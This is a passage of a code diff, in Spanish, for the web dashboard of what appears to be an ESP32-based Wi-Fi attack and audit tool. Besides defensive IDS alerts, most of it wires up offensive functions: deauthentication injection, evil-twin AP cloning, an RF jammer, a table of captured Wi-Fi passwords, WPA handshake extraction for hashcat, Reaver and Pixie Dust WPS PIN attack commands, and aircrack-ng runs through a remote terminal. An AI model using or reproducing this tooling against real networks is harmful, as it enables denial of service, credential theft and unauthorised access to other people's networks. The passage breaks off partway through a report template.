+        logs.innerHTML += `<span class="${data.type === 'stderr' ? 'text-red-400' : 'text-gray-300'}">${data.text}</span>`;
+        logs.scrollTop = logs.scrollHeight;
+    });
+
+    socket.on('flash_status', data => {
+        const logs = document.getElementById('flash-logs');
+        if (data.status === 'success') {
+            logs.innerHTML += `\n<span class="text-green-400 font-bold">✅ ${data.msg}</span>\n`;
+            addAlert('⚡ FLASHEO COMPLETADO', 'El código se ha subido correctamente al ESP32.', true);
+            const btn = document.getElementById('close-flash-btn');
+            btn.classList.remove('hidden');
+            btn.classList.replace('bg-gray-600', 'bg-green-600');
+            btn.classList.replace('hover:bg-gray-500', 'hover:bg-green-500');
+            setTimeout(connectPort, 2000);
+        } else if (data.status === 'error') {
+            logs.innerHTML += `\n<span class="text-red-500 font-bold">❌ ${data.msg}</span>\n`;
+            addAlert('❌ ERROR DE FLASHEO', 'Fallo al subir el código al ESP32.', false);
+            document.getElementById('close-flash-btn').classList.remove('hidden');
+        }
+    });
+
+    // ── Fox Hunt ──
+    let currentTarget = null;
+    function startFoxHunt(mac) {
+        currentTarget = mac;
+        document.getElementById('fh-target').innerText = mac;
+        document.getElementById('fox-hunt-modal').style.display = 'flex';
+    }
+    function stopFoxHunt() {
+        currentTarget = null;
+        document.getElementById('fox-hunt-modal').style.display = 'none';
+    }
+    function updateFoxHunt(rssi, dist) {
+        document.getElementById('fh-rssi').innerText = rssi;
+        document.getElementById('fh-dist').innerText = dist;
+        let pct = Math.max(0, Math.min(100, ((rssi + 100) / 70) * 100));
+        let color = pct > 80 ? '#ef4444' : (pct > 50 ? '#f59e0b' : '#3b82f6');
+        document.getElementById('fh-bar').style.width = `${pct}%`;
+        document.getElementById('fh-bar').style.backgroundColor = color;
+    }
+
+    // ── IDS Events ──
+    socket.on('ids_event', data => {
+        if (currentTarget && (data.client === currentTarget || data.src === currentTarget || data.bssid === currentTarget || data.rogue_mac === currentTarget) && data.rssi) {
+            updateFoxHunt(data.rssi, data.distance);
+        }
+        if (data.event === 'heartbeat') {
+            document.getElementById('t-channel').innerText = data.channel;
+            document.getElementById('t-beacons').innerText = data.beacons;
+            document.getElementById('t-deauths').innerText = data.deauths;
+            document.getElementById('t-probes').innerText = data.probes;
+            trafficChart.data.datasets[0].data.push(data.beacons);
+            trafficChart.data.datasets[1].data.push(data.probes);
+            trafficChart.data.datasets[2].data.push(data.deauths + data.eapols * 10);
+            trafficChart.data.datasets.forEach(d => d.data.shift());
+            trafficChart.update();
+        }
+        if (data.event === 'probe_req') {
+            radarProbes[data.client] = { vendor: data.vendor, ssid: data.searching_ssid, rssi: data.rssi, distance: data.distance };
+            renderProbes();
+            addGraphNode(data.client, radarProbes[data.client].vendor, 'CLIENT', `MAC: ${data.client}`);
+            if (radarProbes[data.client].ssid && radarProbes[data.client].ssid !== '<Red_Oculta>') {
+                const fakeApId = `virtual-${radarProbes[data.client].ssid}`;
+                addGraphNode(fakeApId, radarProbes[data.client].ssid, 'AP', 'Virtual AP (Probed)');
+                addGraphEdge(data.client, fakeApId, 'PROBE');
+                // Increment probe counter for any matching visible AP
+                Object.keys(networkStats).forEach(bssid => {
+                    const row = document.getElementById(`net-${bssid.replace(/:/g,'')}`);
+                    if (row && row.querySelector('.ssid-cell') && row.querySelector('.ssid-cell').innerText.includes(data.searching_ssid)) {
+                        networkStats[bssid].probes++; updateNetworkTrafficUI(bssid);
+                    }
+                });
+            }
+        }
+        if (data.event === 'audit') {
+            addGraphNode(data.bssid, data.ssid || 'Hidden', 'AP', `MAC: ${data.bssid}\nVendor: ${data.ap_vendor}\nCH: ${data.channel}`);
+            const tbody = document.getElementById('networks-body');
+            const mfp = String(data.mfp_protected) === 'true';
+            const pmkid = String(data.pmkid) === 'true';
+            const mfpBadge = mfp ? '<span class="text-green-500 font-bold">Protegido (802.11w)</span>' : '<span class="text-red-500 font-bold">Vulnerable (DoS)</span>';
+            const pmkidBadge = pmkid ? '<span class="ml-2 badge bg-purple-600 text-white">Vulnerable PMKID</span>' : '';
+            let wpsBadge = '';
+            const wpsEnabled = String(data.wps_enabled) === 'true' || data.wps_enabled === 1;
+            const wpsLocked  = String(data.wps_locked)  === 'true' || data.wps_locked  === 1;
+            if (wpsEnabled) {
+                let wpsStatus = 'Vulnerable (PIN)', bgClass = 'bg-red-600 animate-pulse';
+                if (wpsLocked) { wpsStatus = 'Locked'; bgClass = 'bg-yellow-600'; }
+                else if (data.wps_method && data.wps_method.includes('Push Button')) { wpsStatus = 'PBC (Seguro Remoto)'; bgClass = 'bg-green-600'; }
+                else if (data.wps_manufacturer && (data.wps_manufacturer.toLowerCase().includes('ralink') || data.wps_manufacturer.toLowerCase().includes('broadcom') || data.wps_manufacturer.toLowerCase().includes('realtek'))) { wpsStatus = 'Pixie Dust Vulnerable!'; bgClass = 'bg-fuchsia-600 animate-bounce'; }
+                wpsBadge = `<span class="ml-2 badge ${bgClass} text-white" title="Método: ${data.wps_method || 'Desconocido'}">WPS: ${wpsStatus}</span>`;
+                if (data.wps_version && data.wps_version.includes('1.0')) wpsBadge += ' <span class="ml-1 badge bg-red-800 text-red-200">v1.0</span>';
+                else if (data.wps_version && data.wps_version.includes('2.0')) wpsBadge += ' <span class="ml-1 badge bg-orange-600 text-orange-200">v2.0</span>';
+            }
+            const displayVendor = data.wps_manufacturer ? `<span class="text-fuchsia-300 font-bold" title="DPI">🔍 ${data.wps_manufacturer} ${data.wps_model || ''}</span>` : `<span class="text-blue-300">${data.ap_vendor || 'Unknown'}</span>`;
+            const targetSsid = document.getElementById('target-ssid-input').value.trim();
+            const isTarget = data.ssid === targetSsid && targetSsid !== '';
+            const rowClass = isTarget ? 'bg-blue-900 bg-opacity-40 border-l-4 border-yellow-400' : 'border-b border-gray-800';
+            const star = isTarget ? '⭐ ' : '';
+            // Init traffic stat for this AP
+            ensureNetworkStat(data.bssid);
+            networkStats[data.bssid].beacons++;
+            const row = `<tr id="net-${data.bssid.replace(/:/g,'')}" class="${rowClass}"><td class="py-2 font-bold text-white ssid-cell pl-2">${star}${data.ssid}</td><td><span class="block">${displayVendor}</span><span class="font-mono text-xs text-gray-500">${data.bssid}</span></td><td>${mfpBadge}${pmkidBadge}${wpsBadge}</td><td id="traffic-${data.bssid.replace(/:/g,'')}"></td><td>
+                <div class="flex items-center flex-wrap gap-1 mt-1">
+                    ${getRssiBadge(data.rssi, data.distance)}
+                    <button onclick="startFoxHunt('${data.bssid}')" title="Cazar físicamente" class="bg-gray-700 hover:bg-gray-600 px-2 py-1 rounded text-xs">🎯</button>
+                    <button onclick="lockChannel(${data.channel})" title="Anclar al canal ${data.channel}" class="bg-blue-700 hover:bg-blue-600 px-2 py-1 rounded text-xs">🔒</button>
+                    <button onclick="sendDeauth('${data.bssid}','FF:FF:FF:FF:FF:FF')" title="Inyectar Deauth" class="bg-red-700 hover:bg-red-600 px-2 py-1 rounded text-xs">🔥</button>
+                    <button onclick="cloneEvilTwin('${data.ssid}','${data.bssid}')" title="Clonar (Evil Twin)" class="bg-purple-700 hover:bg-purple-600 px-2 py-1 rounded text-xs">👿</button>
+                    ${wpsEnabled ? `<button onclick="openReaverModal('${data.bssid}','${data.ssid}',${data.channel})" class="bg-red-800 hover:bg-red-700 border border-red-500 px-2 py-1 rounded text-xs text-white font-bold">⚔️ Online WPS</button>` : ''}
+                </div>
+            </td></tr>`;
+            if (!document.getElementById(`net-${data.bssid.replace(/:/g,'')}`)) {
+                if (isTarget) tbody.innerHTML = row + tbody.innerHTML;
+                else tbody.innerHTML += row;
+            }
+            // Always update traffic UI (even for existing rows)
+            updateNetworkTrafficUI(data.bssid);
+            if (data.ssid === '<Red_Oculta>') {
+                const hiddenTbody = document.getElementById('hidden-networks-body');
+                const hnRow = `<tr id="hn-${data.bssid.replace(/:/g,'')}" class="border-b border-gray-800"><td class="py-2 font-mono text-xs text-gray-400">${data.bssid}</td><td class="text-gray-500 italic hn-status">Oculta (Esperando Decloak...)</td><td>${getRssiBadge(data.rssi, data.distance)}</td></tr>`;
+                if (!document.getElementById(`hn-${data.bssid.replace(/:/g,'')}`)) hiddenTbody.innerHTML += hnRow;
+            }
+        }
+        if (data.event === 'wps_dpi') {
+            const row = document.getElementById(`net-${data.bssid.replace(/:/g,'')}`);
+            if (row) row.querySelector('td:nth-child(2)').innerHTML = `<span class="block text-fuchsia-300 font-bold">🔍 ${data.manufacturer} ${data.model || ''}</span><span class="font-mono text-xs text-gray-500">${data.bssid}</span>`;
+        }
+        if (data.event === 'decloak') {
+            addAlert('👁️ RED OCULTA REVELADA', `Un cliente se conectó a la red oculta ${data.bssid} revelando que su nombre es "${data.ssid}".`, true, data.ssid);
+            const row = document.getElementById(`net-${data.bssid.replace(/:/g,'')}`);
+            if (row) row.querySelector('.ssid-cell').innerHTML = `<span class="text-purple-400 font-bold">${data.ssid}</span> (Oculta)`;
+            const hnRow = document.getElementById(`hn-${data.bssid.replace(/:/g,'')}`);
+            if (hnRow) { hnRow.querySelector('.hn-status').innerHTML = `<span class="text-purple-400 font-bold">¡Revelada!</span> <span class="text-white font-bold">${data.ssid}</span>`; hnRow.classList.add('bg-purple-900', 'bg-opacity-20'); }
+        }
+        if (data.event === 'alert' && data.type === 'evil_twin_detected') addAlert('💀 EVIL TWIN DETECTADO', `Identificado router falso imitando "${data.ssid}". Hardware: ${data.rogue_vendor}. Distancia: ${data.distance}. <button onclick="startFoxHunt('${data.rogue_mac}')" class="bg-red-800 px-2 rounded mt-1">🎯 Rastrear</button>`, false, data.ssid);
+        if (data.event === 'alert' && data.type === 'krack_attempt') addAlert('🚨 FIRMA KRACK DETECTADA', `Intento de re-instalación de claves (Key Reinstallation Attack). Atacante retransmitiendo Msg 3 EAPOL hacia ${data.dst}. Hardware: ${data.src_vendor}.`, false);
+        if (data.event === 'alert' && data.type === 'attack_success') addAlert('🔥 INYECCIÓN OK', data.msg, true);
+        if (data.event === 'alert' && data.type === 'clone_started') { addAlert('👿 EVIL TWIN LEVANTADO', data.msg, true); addGraphNode(`evil-${Date.now()}`, '👿 EVIL TWIN', 'EVIL', 'Tu clon'); }
+        if (data.event === 'alert' && data.type === 'clone_stopped') addAlert('🛑 EVIL TWIN APAGADO', data.msg, true);
+        if (data.event === 'eapol_handshake') {
+            addAlert('🔐 WPA2 HANDSHAKE CAPTURADO', `Apretón de manos robado por hardware ${data.src_vendor}. PCAP guardado. Distancia: ${data.distance}`, false);
+            if (data.src && data.dst) { addGraphNode(data.src, data.src_vendor || 'Client', 'CLIENT'); addGraphEdge(data.src, data.dst, 'LINK'); }
+            // Count EAPOL towards the AP (dst)
+            if (data.dst) { ensureNetworkStat(data.dst); networkStats[data.dst].eapols++; updateNetworkTrafficUI(data.dst); }
+        }
+        if (data.event === 'alert' && data.type === 'attack_success' && data.bssid) {
+            ensureNetworkStat(data.bssid); networkStats[data.bssid].deauths++; updateNetworkTrafficUI(data.bssid);
+        }
+        if (data.event === 'client_data') {
+            if (!activeDevices[data.src]) {
+                activeDevices[data.src] = { bssid: data.bssid, pkts: 0, rssi: data.rssi, distance: data.distance };
+            }
+            activeDevices[data.src].pkts++;
+            activeDevices[data.src].rssi = data.rssi;
+            activeDevices[data.src].distance = data.distance;
+            if (data.bssid !== "FF:FF:FF:FF:FF:FF") {
+                activeDevices[data.src].bssid = data.bssid;
+                updateActiveDeviceFilterOptions(data.bssid);
+            }
+            
+            renderActiveDevices();
+            
+            // Relacionar en el mapa topológico si está dirigido a un AP
+            if (data.bssid && data.bssid !== "FF:FF:FF:FF:FF:FF" && data.src !== "FF:FF:FF:FF:FF:FF") {
+                addGraphNode(data.src, 'Client', 'CLIENT', `MAC: ${data.src}`);
+                addGraphEdge(data.src, data.bssid, 'LINK');
+            }
+        }
+        if (data.event === 'rf_sweep') { rfChart.data.datasets[0].data = data.data; rfChart.update(); }
+    });
+
+    // ── RF Controls ──
+    let isRfSweeping = false, isRfJamming = false;
+
+    function toggleRfSweep() {
+        if (isRfJamming) { alert('Apaga el Jammer primero.'); return; }
+        const btn = document.getElementById('btn-sweep');
+        if (!isRfSweeping) {
+            socket.emit('send_cmd', { cmd: 'SWEEP_RF' });
+            document.getElementById('rf-overlay').classList.add('hidden');
+            btn.classList.replace('bg-blue-700','bg-red-700'); btn.classList.replace('hover:bg-blue-600','hover:bg-red-600');
+            btn.innerText = '🛑 Detener Escáner';
+        } else {
+            socket.emit('send_cmd', { cmd: 'STOP_RF' });
+            document.getElementById('rf-overlay').classList.remove('hidden');
+            btn.classList.replace('bg-red-700','bg-blue-700'); btn.classList.replace('hover:bg-red-600','hover:bg-blue-600');
+            btn.innerText = '📊 Iniciar Escáner 2.4GHz';
+            rfChart.data.datasets[0].data = Array(126).fill(0); rfChart.update();
+        }
+        isRfSweeping = !isRfSweeping;
+    }
+
+    function toggleRfJammer() {
+        if (isRfSweeping) toggleRfSweep();
+        const btn = document.getElementById('btn-jammer');
+        const overlay = document.getElementById('rf-overlay');
+        if (!isRfJamming) {
+            const ch = document.getElementById('jam-ch-input').value;
+            socket.emit('send_cmd', { cmd: `JAM_RF:${ch}` });
+            btn.classList.add('animate-pulse'); btn.innerText = '🔥 EMITIENDO...';
+            overlay.innerHTML = `<span class="text-red-500 font-bold text-2xl animate-pulse flex items-center gap-2">⚠️ JAMMER ACTIVO EN CANAL ${ch}</span><span class="text-xs text-gray-400 mt-2">Emitiendo ruido de fuerza bruta.</span>`;
+            overlay.classList.remove('hidden');
+        } else {
+            socket.emit('send_cmd', { cmd: 'STOP_RF' });
+            btn.classList.remove('animate-pulse'); btn.innerText = '🚫 JAMMER';
+            overlay.innerHTML = '<span class="text-green-500 font-bold mb-2">Módulo RF en reposo</span><span class="text-xs text-gray-400">Inicia el escáner para ver la saturación de los 125 canales</span>';
+            overlay.classList.add('hidden');
+            setTimeout(() => overlay.classList.remove('hidden'), 500);
+        }
+        isRfJamming = !isRfJamming;
+    }
+
+    // ── Wi-Fi Commands ──
+    function resumeHopping() { socket.emit('send_cmd', { cmd: 'HOP' }); addAlert('📡 COMANDO ENVIADO', 'Reanudando salto de canales automático.', true); }
+    function lockChannel(ch) {
+        if (!ch || ch === 'undefined') { alert('Canal desconocido.'); return; }
+        socket.emit('send_cmd', { cmd: `LOCK_CH:${ch}` });
+        addAlert('🔒 CANAL ANCLADO', `ESP32 fijado en canal ${ch}.`, true);
+    }
+    function sendDeauth(bssid, target) {
+        socket.emit('send_cmd', { cmd: `DEAUTH:${bssid}:${target}` });
+        addAlert('🔥 ATAQUE DEAUTH INICIADO', `Inyectando tramas de desautenticación en ${bssid} contra ${target}.`, false);
+        fireDeauthLaser(bssid, target);
+    }
+    function cloneEvilTwin(ssid, bssid) {
+        if (!confirm(`¿Estás seguro de que quieres levantar un AP abierto falso imitando a ${ssid}?`)) return;
+        socket.emit('send_cmd', { cmd: `CLONE:${ssid}:${bssid}` });
+    }
+    function stopEvilTwin() { socket.emit('send_cmd', { cmd: 'STOP_CLONE' }); }
+
+    function renderProbes() {
+        const sortedProbes = Object.entries(radarProbes).sort((a,b) => b[1].rssi - a[1].rssi).slice(0, 20);
+        document.getElementById('probes-body').innerHTML = sortedProbes.map(([client, p]) =>
+            `<tr><td class="py-1"><span class="block font-bold text-white">${p.vendor}</span><span class="font-mono text-xs text-gray-500">${client}</span></td><td class="text-yellow-300 font-bold">${p.ssid}</td><td>${getRssiBadge(p.rssi, p.distance)} <button onclick="startFoxHunt('${client}')" class="ml-2 bg-gray-700 hover:bg-gray-600 px-2 py-1 rounded text-xs">🎯 Cazar</button></td></tr>`
+        ).join('');
+    }
+
+    // ── Historical Data ──
+    function loadCredentials() {
+        fetch('/api/db/credentials').then(r => r.json()).then(creds => {
+            document.getElementById('credentials-body').innerHTML = creds.map(c =>
+                `<tr class="border-b border-gray-800 hover:bg-gray-800"><td class="py-2 text-xs text-gray-500">${new Date(c.timestamp).toLocaleString()}</td><td class="text-yellow-400 font-bold">${c.ssid}</td><td class="text-white">${c.username || '-'}</td><td class="text-red-400 font-mono">${c.password}</td></tr>`
+            ).join('');
+        });
+    }
+
+    function loadHistoricalData() {
+        fetch('/api/db/networks').then(r => r.json()).then(nets => {
+            const tbody = document.getElementById('networks-body');
+            tbody.innerHTML = '';
+            nets.forEach(data => {
+                const mfpBadge = data.mfp_protected ? '<span class="text-green-500 font-bold">Protegido (802.11w)</span>' : '<span class="text-red-500 font-bold">Vulnerable (DoS)</span>';
+                const pmkidBadge = data.pmkid ? '<span class="ml-2 badge bg-purple-600 text-white">Vulnerable PMKID</span>' : '';
+                let wpsBadge = '';
+                if (data.wps_enabled) {
+                    let wpsStatus = 'Vulnerable (PIN)', bgClass = 'bg-red-600 animate-pulse';
+                    if (data.wps_locked) { wpsStatus = 'Locked'; bgClass = 'bg-yellow-600'; }
+                    else if (data.wps_method && data.wps_method.includes('Push Button')) { wpsStatus = 'PBC (Seguro Remoto)'; bgClass = 'bg-green-600'; }
+                    else if (data.wps_manufacturer && (data.wps_manufacturer.toLowerCase().includes('ralink') || data.wps_manufacturer.toLowerCase().includes('broadcom') || data.wps_manufacturer.toLowerCase().includes('realtek'))) { wpsStatus = 'Pixie Dust Vulnerable!'; bgClass = 'bg-fuchsia-600 animate-bounce'; }
+                    wpsBadge = `<span class="ml-2 badge ${bgClass} text-white">WPS: ${wpsStatus}</span>`;
+                    if (data.wps_version && data.wps_version.includes('1.0')) wpsBadge += ' <span class="ml-1 badge bg-red-800 text-red-200">v1.0</span>';
+                    else if (data.wps_version && data.wps_version.includes('2.0')) wpsBadge += ' <span class="ml-1 badge bg-orange-600 text-orange-200">v2.0</span>';
+                }
+                const displayVendor = data.wps_manufacturer ? `<span class="text-fuchsia-300 font-bold">🔍 ${data.wps_manufacturer} ${data.wps_model || ''}</span>` : `<span class="text-blue-300 font-bold">${data.vendor || 'Unknown'}</span>`;
+                const targetSsid = document.getElementById('target-ssid-input').value.trim();
+                const isTarget = data.ssid === targetSsid && data.ssid !== '';
+                const rowClass = isTarget ? 'bg-blue-900 bg-opacity-40 border-l-4 border-yellow-400 opacity-60' : 'border-b border-gray-800 opacity-60';
+                const star = isTarget ? '⭐ ' : '';
+                const rssiBadge = getRssiBadge(data.max_rssi, 'Histórico');
+                ensureNetworkStat(data.bssid);
+                const row = `<tr id="net-${data.bssid.replace(/:/g,'')}" class="${rowClass}"><td class="py-2 font-bold text-gray-400 ssid-cell pl-2">${star}${data.ssid}</td><td><span class="block">${displayVendor}</span><span class="font-mono text-xs text-gray-500">${data.bssid}</span></td><td>${mfpBadge}${pmkidBadge}${wpsBadge}</td><td id="traffic-${data.bssid.replace(/:/g,'')}"></td><td>
+                    <div class="flex items-center flex-wrap gap-1 mt-1">${rssiBadge}<span class="text-xs text-gray-500 ml-2">${new Date(data.last_seen).toLocaleString()}</span></div>
+                    <div class="flex flex-wrap gap-1 mt-2">
+                        <button onclick="sendDeauth('${data.bssid}','FF:FF:FF:FF:FF:FF')" class="bg-red-700 hover:bg-red-600 border border-red-500 px-2 py-1 rounded text-[10px] text-white font-bold transition">🔥 Deauth</button>
+                        <button onclick="cloneEvilTwin('${data.ssid}','${data.bssid}')" class="bg-purple-700 hover:bg-purple-600 border border-purple-500 px-2 py-1 rounded text-[10px] text-white font-bold transition">🎭 Evil Twin</button>
+                        ${data.wps_enabled ? `<button onclick="openReaverModal('${data.bssid}','${data.ssid}')" class="bg-red-900 hover:bg-red-800 border border-red-700 px-2 py-1 rounded text-[10px] text-white transition">⚔️ Reaver</button>` : ''}
+                    </div>
+                </td></tr>`;
+                if (isTarget) tbody.innerHTML = row + tbody.innerHTML;
+                else tbody.innerHTML += row;
+                updateNetworkTrafficUI(data.bssid);
+            });
+        });
+
+        fetch('/api/db/probes').then(r => r.json()).then(probes => {
+            probes.forEach(p => {
+                if (!radarProbes[p.mac]) radarProbes[p.mac] = { vendor: p.vendor, ssid: p.ssid, rssi: p.max_rssi, distance: 'Histórico' };
+            });
+            renderProbes();
+        });
+        loadCredentials();
+    }
+    loadHistoricalData();
+
+    // ── Hashcat Modal ──
+    function openHashcatModal(filename) {
+        const modal = document.getElementById('hashcat-modal');
+        modal.style.display = 'flex';
+        document.getElementById('hc-loading').classList.remove('hidden');
+        document.getElementById('hc-error').classList.add('hidden');
+        document.getElementById('hc-results').classList.add('hidden');
+        fetch('/api/hashcat/extract', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ filename }) })
+            .then(r => r.json())
+            .then(data => {
+                document.getElementById('hc-loading').classList.add('hidden');
+                if (data.error || !data.success) {
+                    document.getElementById('hc-error-msg').innerText = data.error || 'Error desconocido';
+                    document.getElementById('hc-error').classList.remove('hidden');
+                    return;
+                }
+                document.getElementById('hc-results').classList.remove('hidden');
+                document.getElementById('hc-summary').innerText = `${data.total} hash(es) encontrado(s) | ${data.packets_analyzed} paquetes analizados | SSIDs: ${(data.ssids_found || []).join(', ')}`;
+                if (data.hc22000_file) {
+                    const dlBtn = document.getElementById('hc-download-btn');
+                    dlBtn.href = `/capturas/${data.hc22000_file}`; dlBtn.download = data.hc22000_file; dlBtn.classList.remove('hidden');
+                    document.getElementById('hc-cmd-filename').innerText = data.hc22000_file;
+                    document.querySelectorAll('.hc-cmd-filename-ref').forEach(e => e.innerText = data.hc22000_file);
+                }
+                document.getElementById('hc-hashes-container').innerHTML = data.hashes.map((h, i) => `
+                    <div class="bg-[#0d1117] border border-red-900 rounded-lg p-5">
+                        <div class="flex justify-between items-center mb-4">
+                            <h3 class="text-red-400 font-bold text-lg">🔑 Handshake #${i+1}: ${h.ssid}</h3>
+                            <span class="text-xs bg-gray-800 text-gray-300 border border-gray-600 px-2 py-1 rounded">${h.messages_captured.join(' + ')}</span>
+                        </div>
+                        <div class="grid grid-cols-2 gap-3 mb-4 text-xs">
+                            <div class="bg-gray-900 p-2 rounded border border-gray-700"><span class="text-gray-400 block">AP (BSSID)</span><span class="text-blue-300 font-mono">${h.bssid}</span></div>
+                            <div class="bg-gray-900 p-2 rounded border border-gray-700"><span class="text-gray-400 block">Cliente (STA)</span><span class="text-green-300 font-mono">${h.client}</span></div>
+                            <div class="bg-gray-900 p-2 rounded border border-gray-700"><span class="text-gray-400 block">MIC</span><span class="text-yellow-300 font-mono break-all">${h.mic}</span></div>
+                            <div class="bg-gray-900 p-2 rounded border border-gray-700"><span class="text-gray-400 block">ANonce</span><span class="text-purple-300 font-mono break-all text-[10px]">${h.anonce.substring(0,32)}...</span></div>
+                        </div>
+                        <div class="mb-3">
+                            <div class="flex justify-between items-center mb-1">
+                                <span class="text-xs text-gray-400 font-bold">Hash WPA*02 (HC22000):</span>
+                                <button onclick="navigator.clipboard.writeText('${h.hash.replace(/'/g,"\\'")}')\" class="text-xs bg-blue-700 hover:bg-blue-600 px-2 py-1 rounded text-white transition">📋 Copiar</button>
+                            </div>
+                            <div class="bg-black p-3 rounded font-mono text-[10px] text-green-400 border border-green-900 break-all select-all overflow-x-auto">${h.hash}</div>
+                        </div>
+                    </div>`).join('');
+            })
+            .catch(err => { document.getElementById('hc-loading').classList.add('hidden'); document.getElementById('hc-error-msg').innerText = `Error de red: ${err.message}`; document.getElementById('hc-error').classList.remove('hidden'); });
+    }
+    function closeHashcatModal() { document.getElementById('hashcat-modal').style.display = 'none'; }
+
+    // ── Pixie Modal ──
+    function openPixieModal(filename) {
+        const modal = document.getElementById('pixie-modal');
+        modal.style.display = 'flex';
+        document.getElementById('pixie-loading').classList.remove('hidden');
+        document.getElementById('pixie-error').classList.add('hidden');
+        document.getElementById('pixie-results').classList.add('hidden');
+        fetch('/api/pixie/extract', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ filename }) })
+            .then(r => r.json())
+            .then(data => {
+                document.getElementById('pixie-loading').classList.add('hidden');
+                if (data.error || !data.success) { document.getElementById('pixie-error-msg').innerText = data.error || 'Error desconocido'; document.getElementById('pixie-error').classList.remove('hidden'); return; }
+                document.getElementById('pixie-results').classList.remove('hidden');
+                document.getElementById('pixie-cmd-value').value = data.command;
+            })
+            .catch(() => { document.getElementById('pixie-loading').classList.add('hidden'); document.getElementById('pixie-error-msg').innerText = 'Error de red al contactar con la API.'; document.getElementById('pixie-error').classList.remove('hidden'); });
+    }
+    function closePixieModal() { document.getElementById('pixie-modal').style.display = 'none'; }
+    function copyPixieCommand() {
+        navigator.clipboard.writeText(document.getElementById('pixie-cmd-value').value);
+        const btn = document.getElementById('pixie-copy-btn');
+        btn.innerText = '¡Copiado!'; setTimeout(() => btn.innerText = '📋 Copiar', 2000);
+    }
+
+    // ── Aircrack Quick Modal (from vault) ──
+    function openAircrackModal(filename, ssid) {
+        const modal = document.getElementById('aircrack-modal');
+        modal.style.display = 'flex';
+        document.getElementById('aircrack-target-ssid').innerText = ssid;
+        document.getElementById('aircrack-target-file').innerText = filename;
+        updateAircrackCmd(filename);
+    }
+    function updateAircrackCmd(filename) {
+        const wl = document.getElementById('aircrack-wordlist').value || '/usr/share/wordlists/rockyou.txt';
+        const cmd = `aircrack-ng "${filename}" -w "${wl}"`;
+        document.getElementById('aircrack-cmd-value').value = cmd;
+        document.getElementById('aircrack-cmd-value').dataset.filename = filename;
+    }
+    function closeAircrackModal() { document.getElementById('aircrack-modal').style.display = 'none'; }
+    function runAircrackFromModal() {
+        const filename = document.getElementById('aircrack-cmd-value').dataset.filename;
+        const wl = document.getElementById('aircrack-wordlist').value || '/usr/share/wordlists/rockyou.txt';
+        fetch('/api/aircrack/crack', { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ filename, wordlist: wl }) })
+            .then(r => r.json()).then(data => { closeAircrackModal(); runRemoteCommand(data.command, true); });
+    }
+
+    // ── Reaver Modal ──
+    function openReaverModal(bssid, ssid, channel) {
+        const modal = document.getElementById('reaver-modal');
+        modal.style.display = 'flex';
+        document.getElementById('reaver-target-bssid').innerText = bssid;
+        document.getElementById('reaver-target-ssid').innerText = ssid;
+        const chParam = channel ? `-c ${channel} ` : '';
+        document.getElementById('reaver-cmd-value').value = `reaver -i wlan0mon -b ${bssid} ${chParam}-vv -K 1`;
+        const tbody = document.getElementById('reaver-pins-body');
+        tbody.innerHTML = '<tr><td colspan="2" class="text-center py-4"><div class="animate-spin rounded-full h-6 w-6 border-b-2 border-red-500 mx-auto"></div></td></tr>';
+        fetch(`/api/wps/pins?bssid=${bssid}`).then(r => r.json()).then(data => {
+            if (data.pins && data.pins.length > 0) {
+                tbody.innerHTML = data.pins.map(p => `<tr class="border-b border-gray-800"><td class="py-2"><span class="font-mono text-white text-lg bg-gray-900 px-2 py-1 border border-gray-700 rounded">${p.pin}</span></td><td class="text-gray-400 text-xs">${p.algo}</td><td><button onclick="setReaverPin('${p.pin}')" class="bg-gray-700 hover:bg-gray-600 text-xs px-2 py-1 rounded text-white">Usar este PIN</button></td></tr>`).join('');
+                setReaverPin(data.pins[0].pin);
+            } else {
+                tbody.innerHTML = '<tr><td colspan="3" class="text-center py-2 text-gray-500">No se pudieron generar PINs.</td></tr>';
+            }
+        });
+    }
+    function setReaverPin(pin) {
+        const bssid = document.getElementById('reaver-target-bssid').innerText;
+        const textarea = document.getElementById('reaver-cmd-value');
+        const chMatch = textarea.value.match(/-c\s+\d+/);
+        const chParam = chMatch ? `${chMatch[0]} ` : '';
+        textarea.value = `reaver -i wlan0mon -b ${bssid} ${chParam}-p ${pin} -vv`;
+    }
+    function closeReaverModal() { document.getElementById('reaver-modal').style.display = 'none'; }
+    function copyReaverCommand() {
+        navigator.clipboard.writeText(document.getElementById('reaver-cmd-value').value);
+        const btn = document.getElementById('reaver-copy-btn');
+        btn.innerText = '¡Copiado!'; setTimeout(() => btn.innerText = '📋 Copiar a Kali', 2000);
+    }
+
+    // ── Terminal remota ──
+    function runRemoteCommand(cmd, forceWsl = false) {
+        if (!cmd) return;
+        const useWsl = forceWsl || document.getElementById('wsl-checkbox').checked;
+        document.getElementById('wsl-checkbox').checked = useWsl;
+        // Switch to terminal tab
+        switchTab('tab-term');
+        document.getElementById('live-terminal').scrollIntoView({ behavior: 'smooth', block: 'center' });
+        closePixieModal(); closeReaverModal(); closeHashcatModal(); closeAircrackModal();
+        socket.emit('run_terminal_cmd', { cmd, useWsl });
+    }
+
+    socket.on('terminal_output', data => {
+        // Live terminal
+        const term = document.getElementById('live-terminal');
+        if (term.innerText.includes('Esperando ejecución')) term.innerText = '';
+        const span = document.createElement('span');
+        span.className = data.type === 'stderr' ? 'text-red-500' : data.type === 'stdin' ? 'text-yellow-400 font-bold' : data.type === 'system' ? 'text-blue-400 font-bold' : 'text-green-500';
+        span.innerText = data.text;
+        term.appendChild(span);
+        term.scrollTop = term.scrollHeight;
+
+        // Mirror to aircrack log if running
+        if (acIsRunning) appendAircrackLog(data.text, data.type);
+    });
+
+    // ── Report ──
+    function generateReport() {
+        let reportHtml = `<html><head><title>Reporte de Auditoría Wi-Fi</title>
+        <style>body{font-family:'Segoe UI',Arial,sans-serif;padding:40px;color:#333;background:#fafafa;}.container{max-width:900px;margin:0 auto;background:#fff;padding:30px;box-shadow:0 0 10px rgba(0,0,0,0.1);border-radius:8px;}h1{color:#d9534f;border-bottom:2px solid #d9534f;padding-bottom:10px;margin-top:0;}h2{color:#0275d8;margin-top:30px;font-size:1.2em;border-bottom:1px solid #eee;padding-bottom:5px;}table{width:100%;border-collapse:collapse;margin-top:15px;font-size:14px;}th,td{border:1px solid #ddd;padding:10px;text-align:left;}th{background-color:#f8f9fa;font-weight:bold;}.vuln{color:#d9534f;font-weight:bold;}.safe{color:#5cb85c;font-weight:bold;}.footer{margin-top:40px;text-align:center;color:#777;font-size:12px;}</style></head><body><div class="container">
+        <h1>Reporte Ejecutivo de Auditoría (SIGINT)</h1>
